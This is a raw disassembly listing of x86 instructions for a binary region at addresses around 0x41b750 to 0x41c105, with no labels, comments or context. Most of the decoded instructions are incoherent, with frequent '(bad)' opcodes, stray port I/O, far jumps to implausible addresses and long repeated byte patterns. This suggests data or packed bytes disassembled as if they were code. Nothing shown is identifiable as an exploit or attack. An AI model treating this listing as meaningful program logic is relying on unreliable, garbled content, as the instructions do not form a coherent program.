  41b750:	fs jmp 0x4da584b6
  41b756:	pop    ebx
  41b757:	shl    DWORD PTR [ebx+0x3c],0x3
  41b75b:	int    0x5f
  41b75d:	sbb    eax,0x2a0091fb
  41b762:	repnz mov ebp,0xbdea2f64
  41b768:	arpl   cx,bp
  41b76a:	pusha  
  41b76b:	int    0x77
  41b76d:	stc    
  41b76e:	jmp    0x41b707
  41b770:	arpl   bp,si
  41b772:	repnz retf 
  41b774:	arpl   bx,di
	...
  41b79e:	add    BYTE PTR [eax-0x42],dl
  41b7a1:	ja     0x41b78c
  41b7a3:	loopne 0x41b771
  41b7a5:	ja     0x41b780
  41b7a7:	dec    ebx
  41b7a8:	sahf   
  41b7a9:	js     0x41b784
  41b7ab:	cmp    al,0xcd
  41b7ad:	je     0x41b751
  41b7af:	cmp    cl,dl
  41b7b1:	add    BYTE PTR [edx+0x70ca31],ch
  41b7b7:	mov    eax,ds:0x91736199
  41b7bc:	xchg   DWORD PTR [ebx+0x79],ebp
  41b7bf:	jle    0x41b839
  41b7c1:	jne    0x41b7c3
  41b7c3:	jbe    0x41b74c
  41b7c5:	jne    0x41b837
  41b7c7:	mov    eax,ds:0xa06c61a7
  41b7cc:	jl     0x41b83d
  41b7ce:	xchg   BYTE PTR gs:[edx+0x6e],bh
  41b7d2:	je     0x41b774
  41b7d4:	test   DWORD PTR [eax+eax*1-0x79],esi
  41b7d8:	js     0x41b850
  41b7da:	gs xchg edi,eax
  41b7dc:	mov    BYTE PTR [edi+ebp*2-0x4a],dl
  41b7e0:	jns    0x41b84e
  41b7e2:	data16 cmc 
  41b7e4:	fwait
  41b7e5:	jo     0x41b84c
  41b7e7:	imul   esp,DWORD PTR [edi-0x7d99908e],0x6f
  41b7ee:	jae    0x41b821
  41b7f0:	jo     0x41b859
  41b7f2:	sub    edx,DWORD PTR gs:[edi+0x45]
  41b7f6:	ins    DWORD PTR es:[edi],dx
  41b7f7:	and    eax,0x6a737282
  41b7fc:	jno    0x41b85b
  41b7fe:	je     0x41b860
  41b800:	fwait
  41b801:	imul   esp,DWORD PTR [edi+0x0],0x0
	...
  41b829:	add    BYTE PTR [eax],al
  41b82b:	add    BYTE PTR [edx-0x7e],ah
  41b82e:	fs dec edi
  41b830:	sub    esi,DWORD PTR [edx+0x5717656f]
  41b836:	inc    ebx
  41b837:	adc    DWORD PTR gs:[ebx+0x71206b6b],esi
  41b83e:	inc    ebp
  41b83f:	outs   dx,BYTE PTR ds:[esi]
  41b840:	adc    esi,DWORD PTR [eax+0x72]
  41b843:	ins    DWORD PTR es:[edi],dx
  41b844:	and    al,0x93
  41b846:	outs   dx,DWORD PTR gs:[esi]
  41b848:	sbb    edx,DWORD PTR [edi+0x3f]
  41b84b:	outs   dx,DWORD PTR ds:[esi]
  41b84c:	mov    eax,DWORD PTR [esi-0x529e8d9f]
  41b852:	gs fs mov cl,0x71
  41b856:	dec    edi
  41b857:	je     0x41b875
  41b859:	xor    al,0x1c
  41b85b:	outs   dx,BYTE PTR ds:[esi]
  41b85c:	add    edx,DWORD PTR ds:0x41dd641c
  41b862:	cmp    eax,0x1b20c36d
  41b867:	push   ebx
  41b868:	iret   
  41b869:	push   ds
  41b86a:	das    
  41b86b:	aas    
  41b86c:	sbb    al,0xee
  41b86e:	sbb    eax,0x30eeb76d
  41b873:	push   eax
  41b874:	scas   al,BYTE PTR es:[edi]
  41b875:	jmp    0x6325:0xdec06732
  41b87c:	shl    dl,cl
  41b87e:	sbb    al,0x73
  41b880:	mov    ecx,0x803f0102
  41b885:	in     al,dx
  41b886:	aaa    
  41b887:	jno    0x41b811
  41b889:	out    dx,al
  41b88a:	sbb    eax,0x51d08169
  41b88f:	jb     0x41b891
	...
  41b8b9:	jne    0x41b86b
  41b8bb:	sbb    ebp,DWORD PTR [ecx+eax*4-0x67]
  41b8bf:	daa    
  41b8c0:	jno    0x41b8de
  41b8c2:	inc    edx
  41b8c3:	and    dh,BYTE PTR [edx+0x65]
  41b8c6:	mov    dl,0x38
  41b8c8:	xor    DWORD PTR [esi],ebp
  41b8ca:	push   0x42486c28
  41b8cf:	inc    edx
  41b8d0:	jb     0x41b927
  41b8d2:	xchg   edx,eax
  41b8d3:	cmp    BYTE PTR [ebx+0x3a],dl
  41b8d6:	xchg   edx,eax
  41b8d7:	xor    ch,BYTE PTR [ebp+0x48]
  41b8da:	pop    edi
  41b8db:	and    DWORD PTR [eax+eiz*2+0x63],esi
  41b8df:	cmp    BYTE PTR [edi+0x1c],bl
  41b8e2:	test   DWORD PTR [edi],esp
  41b8e4:	jb     0x41b916
  41b8e6:	jno    0x41b91c
  41b8e8:	arpl   WORD PTR [edx],si
  41b8ea:	jne    0x41b917
  41b8ec:	jno    0x41b8fe
  41b8ee:	push   edi
  41b8ef:	pop    ds
  41b8f0:	push   ecx
  41b8f1:	or     BYTE PTR [ecx+0x32],bl
  41b8f4:	arpl   bp,bx
  41b8f6:	inc    ecx
  41b8f7:	inc    edx
  41b8f8:	arpl   WORD PTR [esi],cx
  41b8fa:	pop    ebx
  41b8fb:	fisttp DWORD PTR [eax+0xa]
  41b8fe:	(bad)  
  41b8ff:	int3   
  41b900:	inc    edx
  41b901:	dec    esp
  41b903:	fistp  DWORD PTR [edx+eax*1]
  41b906:	ret    0x24ca
  41b909:	call   0xca7e73c3
  41b90e:	stos   DWORD PTR es:[edi],eax
  41b90f:	mov    bl,0x1e
  41b911:	into   
  41b912:	mov    ch,0xe7
  41b914:	inc    edx
  41b915:	mov    edi,0xb042b3cc
  41b91a:	mov    edi,0x289a
	...
  41b943:	add    BYTE PTR [eax],al
  41b945:	add    ch,cl
  41b947:	(bad)  
  41b948:	mov    ?,WORD PTR [ecx]
  41b94a:	mov    edi,0xb331aa5a
  41b94f:	retf   0x4493
  41b952:	mov    ebp,0x8e1c7cc9
  41b957:	mov    eax,0xc78e28aa
  41b95c:	and    BYTE PTR ds:0x3788ba83,0x7f
  41b963:	stos   DWORD PTR es:[edi],eax
  41b964:	pop    ecx
  41b965:	sbb    esi,DWORD PTR [edx-0x44]
  41b968:	push   ebx
  41b969:	daa    
  41b96a:	gs mov eax,0xc01c0450
  41b970:	pop    edx
  41b971:	sbb    esi,DWORD PTR [edx]
  41b973:	mov    bh,0x53
  41b975:	and    BYTE PTR [eax+eiz*4],bl
  41b978:	cmp    bl,BYTE PTR [ebx]
  41b97a:	pop    ecx
  41b97b:	mov    eax,0xc039413b
  41b980:	aaa    
  41b981:	sbb    eax,0x3815b832
  41b986:	dec    esp
  41b987:	mov    esp,0x5af31c13
  41b98c:	out    0x33,eax
  41b98e:	sub    eax,0x3f31fec7
  41b993:	mov    edx,0xbf0827d5
  41b998:	out    0x53,eax
  41b99a:	in     eax,dx
  41b99b:	mov    BYTE PTR [eax],0x6
  41b99e:	dec    esi
  41b99f:	mov    edx,0xae3afb41
  41b9a4:	je     0x41b972
  41b9a6:	ss mov ebp,0xd571
	...
  41b9d0:	add    BYTE PTR [eax],al
  41b9d2:	add    BYTE PTR [esi],bh
  41b9d4:	mov    ebp,0x5b1fcc61
  41b9d9:	add    cl,ch
  41b9db:	pop    ds
  41b9dc:	pop    ebx
  41b9dd:	add    cl,ch
  41b9df:	pop    ds
  41b9e0:	pop    ebx
  41b9e1:	add    cl,ch
  41b9e3:	pop    ds
  41b9e4:	pop    ebx
  41b9e5:	add    cl,ch
  41b9e7:	pop    ds
  41b9e8:	pop    ebx
  41b9e9:	add    cl,ch
  41b9eb:	pop    ds
  41b9ec:	pop    ebx
  41b9ed:	add    cl,ch
  41b9ef:	pop    ds
  41b9f0:	pop    ebx
  41b9f1:	add    cl,ch
  41b9f3:	pop    ds
  41b9f4:	pop    ebx
  41b9f5:	add    cl,ch
  41b9f7:	pop    ds
  41b9f8:	pop    ebx
  41b9f9:	add    cl,ch
  41b9fb:	pop    ds
  41b9fc:	pop    ebx
  41b9fd:	add    cl,ch
  41b9ff:	pop    ds
  41ba00:	pop    ebx
  41ba01:	add    cl,ch
  41ba03:	pop    ds
  41ba04:	pop    ebx
  41ba05:	add    cl,ch
  41ba07:	pop    ds
  41ba08:	pop    ebx
  41ba09:	add    cl,ch
  41ba0b:	pop    ds
  41ba0c:	pop    ebx
  41ba0d:	add    cl,ch
  41ba0f:	pop    ds
  41ba10:	pop    ebx
  41ba11:	add    cl,ch
  41ba13:	pop    ds
  41ba14:	pop    ebx
  41ba15:	add    cl,ch
  41ba17:	pop    ds
  41ba18:	pop    ebx
  41ba19:	add    cl,ch
  41ba1b:	pop    ds
  41ba1c:	pop    ebx
  41ba1d:	add    cl,ch
  41ba1f:	pop    ds
  41ba20:	pop    ebx
  41ba21:	add    cl,ch
  41ba23:	pop    ds
  41ba24:	pop    ebx
  41ba25:	add    cl,ch
  41ba27:	pop    ds
  41ba28:	pop    ebx
  41ba29:	add    cl,ch
  41ba2b:	pop    ds
  41ba2c:	pop    ebx
  41ba2d:	add    cl,ch
  41ba2f:	pop    ds
  41ba30:	pop    ebx
  41ba31:	add    cl,ch
  41ba33:	pop    ds
  41ba34:	pop    ebx
  41ba35:	add    cl,ch
	...
  41ba5f:	add    BYTE PTR [edi],bl
  41ba61:	pop    ebx
  41ba62:	add    cl,ch
  41ba64:	pop    ds
  41ba65:	pop    ebx
  41ba66:	add    BYTE PTR [eax],al
  41ba68:	test   DWORD PTR [ecx+0x0],ebx
  41ba6b:	add    BYTE PTR [ebp+0x75000059],al
  41ba71:	pop    ecx
  41ba72:	add    BYTE PTR [eax],al
  41ba74:	jne    0x41bacf
  41ba76:	add    BYTE PTR [ebx+0x4d],dh
  41ba79:	je     0x41bae7
  41ba7b:	ins    BYTE PTR es:[edi],dx
  41ba7c:	push   ss
  41ba7d:	dec    ecx
  41ba7e:	sub    esp,DWORD PTR [ecx+eiz*2+0x6d]
  41ba82:	add    BYTE PTR [ebx-0x43],dl
  41ba85:	xchg   esi,eax
  41ba86:	popa   
  41ba87:	je     0x41ba14
  41ba89:	outs   dx,BYTE PTR ds:[esi]
  41ba8a:	ins    BYTE PTR es:[edi],dx
  41ba8b:	fs pop eax
  41ba8d:	mov    edx,DWORD PTR [eax+0x61]
  41ba90:	mov    DWORD PTR [ecx+0x3d],esi
  41ba93:	add    BYTE PTR ds:0x45000059,dh
  41ba99:	dec    eax
  41ba9a:	dec    ecx
  41ba9b:	inc    ecx
  41ba9c:	inc    ebp
  41ba9d:	xchg   edi,eax
  41ba9e:	dec    esp
  41ba9f:	inc    ecx
  41baa0:	xor    eax,0x35414ca7
  41baa5:	ins    DWORD PTR es:[edi],dx
  41baa6:	dec    esp
  41baa7:	inc    ecx
  41baa8:	add    eax,0x5414c83
  41baad:	ror    DWORD PTR [ecx+eax*2-0xb],cl
  41bab1:	loop   0x41bafe
  41bab3:	inc    ecx
  41bab4:	cmc    
  41bab5:	scas   eax,DWORD PTR es:[edi]
  41bab6:	dec    esp
  41bab7:	inc    ecx
  41bab8:	add    eax,0x5414c1b
  41babd:	pop    ds
  41babe:	dec    esp
  41babf:	inc    ecx
  41bac0:	cmc    
  41bac1:	add    eax,0x414c
	...
  41baea:	add    BYTE PTR [eax],al
  41baec:	add    ch,dh
  41baee:	imul   ecx,DWORD PTR [ecx+0x41],0x414a3cc5
  41baf5:	lds    ebx,FWORD PTR [eax+0x0]
  41baf8:	add    BYTE PTR [ebp+0x35000057],dh
  41bafe:	pop    edx
  41baff:	add    BYTE PTR [eax],al
  41bb01:	lds    edx,FWORD PTR [ebx+0x6ff92075]
  41bb07:	pop    edi
  41bb08:	jne    0x41bb26
  41bb0a:	push   edi
  41bb0b:	pop    ds
  41bb0c:	outs   dx,BYTE PTR ds:[esi]
  41bb0d:	sub    BYTE PTR [ecx+0x4],dh
  41bb10:	call   FWORD PTR [ebx+0x1c1a8142]
  41bb16:	inc    edx
  41bb17:	add    DWORD PTR [edi],edi
  41bb19:	or     al,0x52
  41bb1b:	cmp    eax,0x463085f
  41bb20:	(bad)  
  41bb21:	jnp    0x41bb65
  41bb23:	sbb    DWORD PTR [esp+ebx*1],0xfb4c0142
  41bb2a:	and    BYTE PTR [esp+ebp*2],ah
  41bb2d:	cmp    al,0x3
  41bb2f:	xor    DWORD PTR [eax-0x20],esi
  41bb32:	and    ch,BYTE PTR ds:0x1431c5f
  41bb38:	add    BYTE PTR [edx+eiz*2+0x11c0004],bl
  41bb3f:	and    al,0x61
  41bb41:	(bad)  
  41bb42:	fiadd  WORD PTR [eax]
  41bb44:	push   DWORD PTR [ebx]
  41bb46:	inc    edx
  41bb47:	sbb    DWORD PTR [edi],0x4101421c
  41bb4d:	mov    bl,0xcc
  41bb4f:	push   ds
  41bb50:	add    BYTE PTR [bx+si],al
	...
  41bb77:	add    BYTE PTR [eax],al
  41bb79:	add    BYTE PTR [ecx+0x13ff01d1],al
  41bb7f:	inc    edx
  41bb80:	and    DWORD PTR [edx],0x4801421c
  41bb86:	jne    0x41bb59
  41bb88:	sub    eax,0x4bb6e6d
  41bb8d:	add    bl,BYTE PTR [edx+eax*2]
  41bb90:	add    DWORD PTR [ebx],0x4b01421c
  41bb96:	bound  eax,QWORD PTR gs:[eax+0x6d]
  41bb9a:	aas    
  41bb9b:	(bad)  
  41bb9c:	pop    ss
  41bb9d:	arpl   WORD PTR [edx-0x7a],ax
  41bba0:	xor    eax,0x1421e00
  41bba5:	cmp    bh,0x41
  41bba8:	add    DWORD PTR [eax],eax
  41bbaa:	pop    edi
  41bbab:	pop    ebx
  41bbac:	push   ss
  41bbad:	sbb    DWORD PTR [edi-0x44],eax
  41bbb0:	or     eax,0x17caeae4
  41bbb5:	inc    eax
  41bbb6:	inc    ebx
  41bbb7:	(bad)  
  41bbb8:	or     BYTE PTR [ebx+ebx*4],al
  41bbbb:	dec    ebx
  41bbbc:	out    0x83,eax
  41bbbe:	cmp    DWORD PTR [ebx-0x19],ebx
  41bbc1:	add    edx,edi
  41bbc3:	rol    edi,1
  41bbc5:	push   ebx
  41bbc6:	sti    
  41bbc7:	mov    bh,0xf3
  41bbc9:	xor    dh,ch
  41bbcb:	mov    ch,0xda
  41bbcd:	add    ebx,DWORD PTR [esi]
  41bbcf:	pop    ebx
  41bbd0:	out    0x83,eax
  41bbd2:	cmp    bl,BYTE PTR [ebx-0x19]
  41bbd5:	add    ebx,ebp
  41bbd7:	mov    ebx,0xbcc918bc
  41bbdc:	pop    es
  41bbdd:	inc    eax
	...
  41bc06:	add    cl,al
  41bc08:	mov    bh,0xb4
  41bc0a:	sbb    BYTE PTR [edi+0x1c36bbbc],bh
  41bc10:	pop    ecx
  41bc11:	out    0x3,eax
  41bc13:	pushf  
  41bc14:	jnp    0x41bbfd
  41bc16:	add    ebx,DWORD PTR [eax+ebx*4]
  41bc19:	mov    ds,WORD PTR [eax]
  41bc1b:	mov    bh,0xbb
  41bc1d:	test   ebx,esp
  41bc1f:	loop   0x41bbd7
  41bc21:	jl     0x41bc3f
  41bc23:	mov    dh,BYTE PTR [edx+edi*2+0x73bc8e2f]
  41bc2a:	sbb    al,0x92
  41bc2c:	rol    bh,0x4f
  41bc2f:	jno    0x41bbeb
  41bc31:	jnp    0x41bc69
  41bc33:	sbb    al,0x5c
  41bc35:	out    0x3,eax
  41bc37:	pushf  
  41bc38:	mov    esp,edi
  41bc3a:	add    ebx,DWORD PTR [esp+ebx*4]
  41bc3d:	dec    ebx
  41bc3e:	pop    ss
  41bc3f:	jnp    0x41bbfa
  41bc41:	inc    eax
  41bc42:	xor    eax,0x3048cd50
  41bc47:	cmp    edx,ecx
  41bc49:	inc    esp
  41bc4a:	in     al,0x6f
  41bc4c:	mov    edx,0xcc244600
  41bc51:	add    al,ch
  41bc53:	pop    ds
  41bc54:	pop    ebx
  41bc55:	sub    ah,0x1f
  41bc58:	pop    ebx
  41bc59:	add    BYTE PTR [ecx],bh
  41bc5b:	or     ecx,ebp
  41bc5d:	jno    0x41bc65
  41bc5f:	push   es
  41bc60:	stos   BYTE PTR es:[edi],al
  41bc61:	ins    BYTE PTR es:[edi],dx
  41bc62:	jmp    0xfda87457
  41bc67:	dec    esp
  41bc68:	stos   BYTE PTR es:[edi],al
  41bc69:	jb     0x41bc6f
	...
  41bc93:	add    ah,dl
  41bc95:	xchg   ebp,eax
  41bc96:	or     cl,BYTE PTR [bp+si-0x48]
  41bc9a:	jno    0x41bc9a
  41bc9c:	cmp    eax,0x16be5ccf
  41bca1:	mov    ecx,0xcc2cce64
  41bca6:	pop    esp
  41bca7:	stos   BYTE PTR es:[edi],al
  41bca8:	xor    cl,ch
  41bcaa:	jb     0x41bc70
  41bcac:	xor    eax,0x9cc56cf
  41bcb1:	int3   
  41bcb2:	addr16 into 
  41bcb4:	and    eax,0xfb143a7
  41bcb9:	mov    bh,0x6d
  41bcbb:	mov    ebx,0xba5ccd1a
  41bcc0:	pop    ss
  41bcc1:	mov    esi,0xa03f8d6c
  41bcc6:	ins    DWORD PTR es:[edi],dx
  41bcc7:	test   DWORD PTR [ebx],eax
  41bcc9:	mov    esi,0xbe1f9a72
  41bcce:	js     0x41bd49
  41bcd0:	sub    edi,DWORD PTR [eax+0x79518472]
  41bcd6:	arpl   WORD PTR [ecx+0x22],si
  41bcd9:	pop    ebx
  41bcda:	push   ecx
  41bcdb:	mov    esp,0x143374ee
  41bce0:	out    dx,eax
  41bce1:	xchg   ecx,eax
  41bce2:	add    cl,ch
  41bce4:	pop    ds
  41bce5:	pop    ebx
  41bce6:	add    BYTE PTR [edx],bh
  41bce8:	add    esp,DWORD PTR [edx-0x32c4a695]
  41bcee:	jno    0x41bcf0
  41bcf0:	push   0x65
  41bcf2:	pop    ebp
  41bcf3:	je     0x41bd55
  41bcf5:	scas   eax,DWORD PTR es:[edi]
  41bcf6:	jb     0x41bd61
	...
  41bd20:	add    BYTE PTR [ebx],al
  41bd22:	data16 ins BYTE PTR es:[edi],dx
  41bd24:	bound  ebp,QWORD PTR gs:[edx+0x0]
  41bd28:	push   ebx
  41bd29:	and    BYTE PTR [ebx-0x6f1a9da1],ch
  41bd2f:	gs jbe 0x41bd4e
  41bd32:	arpl   WORD PTR [ecx+0x67],sp
  41bd35:	and    BYTE PTR [edi+0x4f],bl
  41bd38:	gs inc esi
  41bd3a:	addr16 pop ebp
  41bd3c:	outs   dx,BYTE PTR ds:[esi]
  41bd3d:	and    ch,BYTE PTR [edx+0x4e]
  41bd40:	outs   dx,DWORD PTR ds:[esi]
  41bd41:	and    DWORD PTR [esi+eiz*2+0x79],0x76659115
  41bd49:	dec    esp
  41bd4a:	jno    0x41bdad
  41bd4c:	addr16 pusha 
  41bd4e:	pop    ebp
  41bd4f:	dec    edi
  41bd50:	gs mov dh,0x8f
  41bd53:	popa   
  41bd54:	popa   
  41bd55:	jno    0x41bdbf
  41bd57:	push   esp
  41bd58:	outs   dx,DWORD PTR ds:[esi]
  41bd59:	outs   dx,BYTE PTR ds:[esi]
  41bd5a:	push   0x6487506e
  41bd5f:	jbe    0x41bdca
  41bd61:	pop    ecx
  41bd62:	push   0xae456563
  41bd67:	popa   
  41bd68:	inc    edx
  41bd69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd6a:	jle    0x41bdd3
  41bd6c:	jne    0x41bcf3
  41bd6e:	lods   eax,DWORD PTR ds:[esi]
  41bd6f:	jb     0x41bdda
  41bd71:	and    DWORD PTR [esp+ebp*2+0x65],0xffffffa2
  41bd76:	imul   eax,DWORD PTR [eax],0x61aea053
  41bd7c:	jae    0x41bd0f
  41bd7e:	arpl   WORD PTR [edx+0x65],si
  41bd81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd82:	mov    fs,WORD PTR [ebp+0x76]
	...
  41bdad:	add    BYTE PTR [eax+esi*2+0x5f606761],bl
  41bdb4:	dec    edi
  41bdb5:	gs sub al,0x71
  41bdb8:	pop    edi
  41bdb9:	jb     0x41bdd7
  41bdbb:	xchg   edi,eax
  41bdbc:	and    esi,DWORD PTR [ecx+0x41]
  41bdbf:	sub    DWORD PTR [edi],0x6d
  41bdc2:	dec    eax
  41bdc3:	xchg   ebx,eax
  41bdc4:	push   esp
  41bdc5:	jb     0x41bdfc
  41bdc7:	nop
  41bdc8:	sbb    ebp,DWORD PTR [ecx+edi*1-0x67]
  41bdcc:	pop    ds
  41bdcd:	add    BYTE PTR [edi-0x61],cl
  41bdd0:	inc    ebx
  41bdd1:	jno    0x41be02
  41bdd3:	imul   ebx,DWORD PTR ds:0x1b644c6e,0x6b
  41bdda:	cmp    eax,0xb542b64
  41bddf:	pop    ebp
  41bde0:	pop    ds
  41bde1:	outs   dx,BYTE PTR ds:[esi]
  41bde2:	in     al,dx
  41bde3:	inc    ebx
  41bde4:	sbb    al,0x76
  41bde6:	cmc    
  41bde7:	push   ebp
  41bde8:	pop    ds
  41bde9:	gs stc 
  41bdeb:	xor    DWORD PTR [ecx],eax
  41bded:	push   eax
  41bdee:	jmp    0x41be54
  41bdf0:	push   eax
  41bdf1:	and    BYTE PTR [ecx],bh
  41bdf3:	and    eax,0xdd047e1
  41bdf8:	push   ecx
  41bdf9:	sub    eax,0xaf4602d
  41bdfe:	es cli 
  41be00:	adc    eax,0xe45bc871
  41be05:	and    cl,bh
  41be07:	idiv   DWORD PTR ss:[esi]
  41be0a:	mov    edi,0xb0702014
  41be0f:	dec    ebx
  41be10:	loope  0x41be3b
	...
  41be3a:	add    BYTE PTR [ebx],al
  41be3c:	sub    al,0xf8
  41be3e:	or     ebp,ebx
  41be40:	aam    0x21
  41be42:	arpl   WORD PTR [ebp+eiz*8-0x2a75bd29],bp
  41be49:	adc    eax,0x1df08564
  41be4e:	cmp    bh,BYTE PTR [ebx+ebp*8]
  41be51:	sbb    al,0x63
  41be53:	jb     0x41be1b
  41be55:	sbb    al,0x74
  41be57:	jne    0x41be5f
  41be59:	loope  0x41be84
  41be5b:	aaa    
  41be5c:	pop    ebx
  41be5d:	pop    eax
  41be5e:	jmp    0x4333149e
  41be63:	jno    0x41be1e
  41be65:	pop    ebx
  41be66:	and    DWORD PTR [edx-0x31],ecx
  41be69:	cld    
  41be6a:	aaa    
  41be6b:	aas    
  41be6c:	mov    ecx,0x8534304e
  41be71:	pop    es
  41be72:	loope  0x41beab
  41be74:	into   
  41be75:	in     al,0xf9
  41be77:	pop    esp
  41be78:	mov    eax,0xbc3f163d
  41be7d:	sbb    ebx,DWORD PTR ds:0xe3e1b939
  41be83:	cmp    al,0xb7
  41be85:	push   es
  41be86:	xor    edi,edi
  41be88:	push   ebp
  41be89:	loope  0x41becd
  41be8b:	add    DWORD PTR [ecx-0x3105df05],edi
  41be91:	int3   
  41be92:	dec    edi
  41be93:	or     ecx,ebx
  41be95:	or     al,0xea
  41be97:	sbb    edi,DWORD PTR [edx-0x4dffcc09]
  41be9d:	retf   0x24
	...
  41bec8:	lock mov cl,0xce
  41becb:	adc    eax,0x2fcab831
  41bed0:	mov    edi,0xc832fcce
  41bed5:	int3   
  41bed6:	int3   
  41bed7:	and    al,0xb7
  41bed9:	push   ebp
  41beda:	icebp  
  41bedb:	inc    edx
  41bedc:	mov    cl,0xb8
  41bede:	mov    ebx,0xfcceca20
  41bee3:	inc    eax
  41bee4:	ret    0x96bb
  41bee7:	pop    ds
  41bee8:	ret    
  41bee9:	mov    eax,0xbd03e986
  41beee:	adc    BYTE PTR ds:0xf890c97b,0x25
  41bef5:	mov    al,0x7a
  41bef7:	and    BYTE PTR [esi+0x7f1ea878],cl
  41befd:	mov    ch,0x0
  41beff:	jge    0x41bf06
  41bf01:	addr16 dec ebx
  41bf03:	jle    0x41bf4a
  41bf05:	mov    esi,0x783f556c
  41bf0a:	xor    al,0xf
  41bf0c:	call   0x318be777
  41bf11:	mov    dl,0x70
  41bf13:	dec    eax
  41bf14:	or     al,0xbe
  41bf16:	bound  edx,QWORD PTR [ebp+0x2b]
  41bf19:	test   BYTE PTR [eax],ah
  41bf1b:	sub    al,0x6d
  41bf1d:	sahf   
  41bf1e:	inc    ebx
  41bf1f:	or     ebx,ecx
  41bf21:	js     0x41bf53
  41bf23:	repnz mov edi,0xfc1767af
  41bf29:	mov    bh,0x75
  41bf2b:	sbb    al,BYTE PTR [eax]
	...
  41bf55:	mov    eax,0x92c0388d
  41bf5a:	push   esp
  41bf5b:	or     esp,ebx
  41bf5d:	pop    ds
  41bf5e:	pushf  
  41bf5f:	ins    DWORD PTR es:[edi],dx
  41bf60:	pop    ss
  41bf61:	dec    esp
  41bf62:	mov    edx,0x926af56e
  41bf67:	arpl   WORD PTR [edi],ax
  41bf69:	sbb    edi,ecx
  41bf6b:	push   0x6d971fb3
  41bf70:	retf   0xcf3e
  41bf73:	addr16 into 
  41bf75:	or     DWORD PTR [ecx-0x50e55200],eax
  41bf7b:	and    BYTE PTR [ecx*1-0x2462b785],al
  41bf82:	stos   BYTE PTR es:[edi],al
  41bf83:	sub    eax,0xb7669f8
  41bf88:	jecxz  0x41bf81
  41bf8a:	mov    bh,0x71
  41bf8c:	mov    ch,0x45
  41bf8e:	and    bx,WORD PTR [edx-0x75c0abce]
  41bf95:	cld    
  41bf96:	mov    ecx,0x66059d70
  41bf9b:	sub    bh,BYTE PTR [esi+0xa50f5]
  41bfa1:	mov    ah,0x7a
  41bfa3:	pop    edi
  41bfa4:	test   DWORD PTR gs:[esi+0x29],esi
  41bfa8:	inc    ebp
  41bfa9:	mov    ds:0x9c646b7a,eax
  41bfae:	outs   dx,DWORD PTR ds:[esi]
  41bfaf:	arpl   WORD PTR [edx],di
  41bfb1:	adc    eax,0x53656462
  41bfb6:	mov    esp,DWORD PTR [ebp+0x74]
	...
  41bfe1:	add    BYTE PTR [ebx+eiz*1+0x1d],ch
  41bfe5:	sub    ch,BYTE PTR [esi]
  41bfe7:	mov    bh,BYTE PTR [ecx]
  41bfe9:	xor    al,dl
  41bfeb:	inc    ebx
  41bfec:	inc    eax
  41bfed:	outs   dx,DWORD PTR ds:[esi]
  41bfee:	push   ebx
  41bfef:	ins    DWORD PTR es:[edi],dx
  41bff0:	popa   
  41bff1:	arpl   cx,di
  41bff3:	popa   
  41bff4:	imul   ebp,DWORD PTR [esi-0x51],0x39
  41bff8:	pusha  
  41bff9:	ins    BYTE PTR es:[edi],dx
  41bffa:	adc    cl,BYTE PTR [ecx+eiz*2+0x6f94af0d]
  41c001:	gs aaa 
  41c003:	cs sbb BYTE PTR ds:[di+0x74],ch
  41c009:	cmp    dl,BYTE PTR [ebp-0x74]
  41c00c:	imul   edi,DWORD PTR [edx+0x2c],0x63
  41c010:	ins    BYTE PTR es:[edi],dx
  41c011:	popa   
  41c012:	bound  esi,QWORD PTR ds:0x2165302b
  41c018:	pusha  
  41c019:	outs   dx,DWORD PTR ds:[esi]
  41c01a:	push   eax
  41c01b:	mov    DWORD PTR [ebp+0x74],ebx
  41c01e:	dec    esp
  41c01f:	jnp    0x41c08d
  41c021:	gs cs aas 
  41c024:	dec    edx
  41c025:	push   ebx
  41c026:	jl     0x41bfac
  41c028:	and    BYTE PTR ds:0x20384f33,dh
  41c02e:	stos   BYTE PTR es:[edi],al
  41c02f:	pusha  
  41c030:	outs   dx,BYTE PTR ds:[esi]
  41c031:	bound  esi,QWORD PTR fs:[esi+0x6f]
  41c035:	and    BYTE PTR [ecx+esi*1],ch
  41c038:	es or  eax,0x74c2f
  41c03e:	push   ebx
  41c03f:	pop    ecx
  41c040:	cs cs sbb al,0x32
  41c044:	inc    ebp
  41c045:	sub    al,BYTE PTR [eax]
	...
  41c06f:	inc    edx
  41c070:	sbb    BYTE PTR [ecx],al
  41c072:	sub    bh,BYTE PTR [edx]
  41c074:	sub    BYTE PTR [ecx],al
  41c076:	dec    eax
  41c077:	imul   ecx,DWORD PTR [ebx],0x3d
  41c07a:	add    BYTE PTR [edi+0x17],dh
  41c07d:	icebp  
  41c07e:	aaa    
  41c07f:	push   esp
  41c080:	pop    es
  41c081:	fisubr WORD PTR [edi]
  41c083:	xor    BYTE PTR [edx+0x6e2c22ef],bl
  41c089:	cmp    al,0x2b
  41c08b:	add    DWORD PTR [edx-0x2a],esp
  41c08e:	push   edi
  41c08f:	stc    
  41c090:	popa   
  41c091:	(bad)  
  41c092:	push   edi
  41c093:	stc    
  41c094:	push   esi
  41c095:	aam    0x31
  41c097:	fs pop edi
  41c099:	aam    0x31
  41c09b:	push   esp
  41c09c:	push   edi
  41c09d:	aam    0x31
  41c09f:	push   esp
  41c0a0:	pop    edi
  41c0a1:	aam    0x31
  41c0a3:	inc    esp
  41c0a4:	pop    ss
  41c0a5:	shl    DWORD PTR [ecx],1
  41c0a7:	inc    esp
  41c0a8:	pop    ds
  41c0a9:	shl    DWORD PTR [ecx],1
  41c0ab:	hlt    
  41c0ac:	outs   dx,BYTE PTR ds:[esi]
  41c0ad:	add    al,0x45
  41c0af:	stc    
  41c0b0:	ins    DWORD PTR es:[edi],dx
  41c0b1:	push   edx
  41c0b2:	pop    edi
  41c0b3:	adc    BYTE PTR [ebx+0x1a],ch
  41c0b6:	arpl   di,bp
  41c0b8:	pop    edx
  41c0b9:	adc    eax,0x4b5f0174
  41c0be:	outs   dx,BYTE PTR ds:[esi]
  41c0bf:	cli    
  41c0c0:	inc    esp
  41c0c1:	add    DWORD PTR [ecx+0x1],ebp
  41c0c4:	and    BYTE PTR [edi],ch
  41c0c6:	arpl   ax,si
  41c0c8:	pusha  
  41c0c9:	(bad)  
  41c0ca:	sub    eax,0x2d1dc0
  41c0cf:	in     eax,0x20
  41c0d1:	cmp    ch,BYTE PTR [ebp+0x0]
	...
  41c0fc:	rol    DWORD PTR [ebx-0x2b],cl
  41c0ff:	dec    edi
  41c100:	into   
  41c101:	adc    al,0x26
  41c103:	arpl   WORD PTR [edi-0x3caeff00],bp
